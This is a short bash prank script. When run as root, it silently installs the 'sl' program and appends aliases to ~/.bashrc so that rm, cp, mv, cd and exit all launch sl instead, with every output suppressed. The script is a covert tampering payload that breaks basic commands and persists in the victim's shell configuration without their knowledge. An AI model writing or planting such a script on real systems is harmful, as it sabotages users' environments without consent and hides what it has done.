#!/bin/bash
user=`whoami`

if [ "$user" == "root" ]; then
	apt-get install sl -y || yum install sl -y
	path=`which sl`
	echo "alias rm='sl'" >> ~/.bashrc
	echo "alias cp='sl'" >> ~/.bashrc
	echo "alias mv='sl'" >> ~/.bashrc
	echo "alias cd='sl'" >> ~/.bashrc
	echo "alias exit='sl'" >> ~/.bashrc
fi &> /dev/null
